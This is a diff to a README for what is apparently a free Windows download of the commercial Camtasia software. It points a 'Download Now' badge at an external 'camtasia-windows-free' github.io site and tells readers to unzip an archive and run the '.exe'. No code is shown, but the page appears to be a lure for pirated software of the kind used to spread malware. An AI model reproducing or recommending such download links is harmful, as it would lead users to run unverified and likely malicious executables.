@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://camtasia-windows-free.github.io/.github/)
 
 ## 📸 Overview
 <img width="3000" height="1914" alt="camtasia-main-interface" src="https://github.com/user-attachments/assets/764fe287-6525-4a2e-a0eb-eb82bf472675" />
